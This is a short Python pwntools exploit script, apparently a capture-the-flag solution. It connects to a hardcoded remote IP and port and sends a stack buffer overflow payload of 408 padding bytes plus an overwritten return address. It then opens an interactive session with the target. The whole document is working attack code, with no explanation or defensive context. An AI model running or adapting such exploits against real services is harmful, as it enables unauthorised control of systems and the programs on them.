from pwn import *

c = remote("34.125.199.248", 4056)

payload = b'A' * 408 + p64(0x00000000004011d6)

c.sendlineafter(":", payload)

c.interactive()
